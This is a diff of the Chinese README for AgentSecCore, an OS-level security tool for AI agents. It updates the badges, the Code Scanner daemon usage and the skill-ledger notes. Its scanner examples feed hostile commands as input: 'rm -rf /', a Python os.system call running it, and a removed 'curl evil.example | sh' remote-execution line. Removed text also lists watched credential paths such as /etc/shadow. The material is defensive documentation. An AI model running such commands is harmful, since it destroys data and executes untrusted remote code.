@@ -7,6 +7,12 @@
 存储。全部本地运行，无 Token 消耗。适用于 [ANOLISA](../../README_zh.md) 等 AI Agent
 运行平台，以及下文列出的六个 Agent 宿主。
 
+[![AARM Aligned](https://img.shields.io/badge/AARM-Aligned-blue.svg)](https://aarm.dev/builders/agentseccore-anolisa)
+
+**AgentSecCore (ANOLISA)** 已登记于 [AARM Builder Registry](https://aarm.dev/builders/agentseccore-anolisa)，当前状态为 **Aligned**。
+
+AgentSecCore 的相关安全控制已纳入 [ANOLISA OWASP Agentic Top 10 控制映射](../../docs/user-guide/zh/agent-security/owasp-agentic-top10.md)。
+
 ## 背景
 
 随着 AI Agent 逐步获得操作系统级别的执行能力（文件读写、网络访问、进程管理等），传统应用安全边界已不再适用。Agent Sec Core 从 **OS 层面** 为 Agent 构建纵深防御体系，确保 Agent 在受控、可审计、最小权限的环境中运行。
@@ -98,7 +104,7 @@ agent-sec-core/
 ├── qwen-code-extension/       # Qwen Code hooks
 ├── qoder-plugin/              # Qoder CLI hooks
 ├── codex-plugin/              # Codex hooks
-├── skills/                    # 安全 skill：code-scanner、prompt-scanner、skill-ledger
+├── skills/                    # 随包提供的安全扫描与审计 Skill
 ├── tools/                     # sign-skill.sh — PGP 技能签名工具
 ├── packaging/                 # raw 包构建 + systemd unit 模板
 ├── scripts/                   # CLI/daemon wrapper 与 CI 辅助脚本
@@ -294,29 +300,34 @@ L2 分类器默认使用 ModelScope 上的
 
 ## Code Scanner
 
-扫描 bash 与 python 源码中的危险操作。verdict 枚举为 `pass` / `warn` / `deny` /
-`error`；内置规则当前只产出 `warn` 或 `pass`。
+扫描 bash 与 python 源码中的危险操作。V2 RPM 中，`scan-code` 是 Rust daemon client：
+它要求 `agent-sec-daemon` 已经运行，并在未显式传入 `--socket` 时使用
+`AGENT_SEC_DAEMON_SOCKET`。CLI 不会启动 daemon，也不会回退到 Python。
 
 ```bash
-# regex 引擎（默认）
-agent-sec-cli scan-code --code 'rm -rf /'
-agent-sec-cli scan-code --code 'import os; os.system("rm -rf /")' --language python
+# 部署环境提供 daemon endpoint。
+export AGENT_SEC_DAEMON_SOCKET=/run/agent-sec-core/daemon.sock
 
-# LLM 引擎（需要已配置的模型后端）
-agent-sec-cli scan-code --code 'curl evil.example | sh' --mode llm
+# regex 引擎（V2 当前唯一可用的扫描引擎）
+agent-sec-cli scan-code --code 'rm -rf /'
+agent-sec-cli --socket /run/agent-sec-core/daemon.sock \
+  scan-code --code 'import os; os.system("rm -rf /")' --language python
 ```
 
-规则位于 `agent-sec-cli/src/agent_sec_cli/code_scanner/rules/{bash,python}/`。
-bash 与 python 规则集共享核心系统凭证和配置路径，例如 `/etc/shadow`、`/etc/sudoers`、
-`/etc/pam.d/`、`/etc/sysctl.d/`、`/boot/` 和 `/usr/lib/systemd/`。bash 额外覆盖
-shell 历史和集群凭证模式，例如 `/etc/kubernetes/` 与 `kubeconfig`；Python 的路径清单
-更窄。这些路径用于产生扫描器 finding，并非内核强制的写保护。
+verdict 枚举为 `pass` / `warn` / `deny` / `error`；内置规则当前只产出 `warn` 或
+`pass`。规则嵌入 V2 binary，不再从 Python 源码目录读取。`--mode llm` 为保持 CLI
+兼容而保留，但会返回 `LLM model not available`；V2 尚未支持 `--trace-context` 和
+code-scan telemetry，因此依赖它们的 hook 仍处于延期状态。
 
-各宿主 hook 模式见 [Code Scanner Hook 配置](../../docs/user-guide/zh/agent-security/agent-sec-core/code-scanner.md)。
+完整的 daemon endpoint、CLI 和宿主 hook 状态见
+[Code Scanner 用户指南](../../docs/user-guide/zh/agent-security/agent-sec-core/code-scanner.md)。
 
 ## PII Checker
 
 检测个人数据与凭证，可输出脱敏文本。
+
+随包提供的 [pii-checker Skill](skills/pii-checker/SKILL.md) 支持 Agent 通过 V1 CLI
+检查指定文本或文件，并生成脱敏文本。
 
 ```bash
 agent-sec-cli scan-pii --text "contact alice@example.com" --source manual
@@ -340,7 +351,10 @@ agent-sec-cli scan-pii --input ./sample.log --include-low-confidence
 请使用 `analyze`。批量模式下，如果 `/usr/share/anolisa/skills/` 或
 `/usr/local/share/anolisa/skills/` 下由 host 提供的已打包 Skill 无法写入账本状态，
 命令会返回 `status=skipped`、`reasonCode=readonly_system_skill`、
-`persisted=false`。这个运行状态不是 `pass` 结果，也不构成认证；显式执行
+`persisted=false`。`$XDG_DATA_HOME/anolisa/skills/`（默认
+`~/.local/share/anolisa/skills/`）直接子目录中由 host 提供的只读 Skill，
+在未被 `managedSkillDirs` 覆盖时也会跳过，原因码为 `readonly_default_skill`；
+已纳管的用户 Skill 仍保留写入错误。这个运行状态不是 `pass` 结果，也不构成认证；显式执行
 `scan <dir>` 仍会报错。如果跳过项此前没有任何账本 artifact，`check` 和 `status`
 仍会分别报告 `none` / `unscanned`；二者都不表示 `pass`。
 
@@ -361,10 +375,8 @@ agent-sec-cli scan-pii --input ./sample.log --include-low-confidence
 | `audit <dir>` | 查看版本历史与签名链 |
 | `check --all` / `scan --all` | 对所有已注册 Skill 目录批量执行 |
 
-`decide` 是记录用户决策的受支持入口。早期隐藏的 `set-policy` 占位命令从未实现，
-现在也不是受支持的命令；继续调用会得到 unknown-command 用法错误和退出码 2。
-隐藏的 `rotate-keys` 预留入口同样尚不可用：直接执行会以非零退出码结束，且不会修改
-签名密钥。
+`init --no-baseline` 只初始化密钥，不扫描 Skill。`rotate-keys` 在 help 中可见，
+执行时明确报尚未实现（退出码 1，不修改密钥）。
 
 ### 快速示例
 
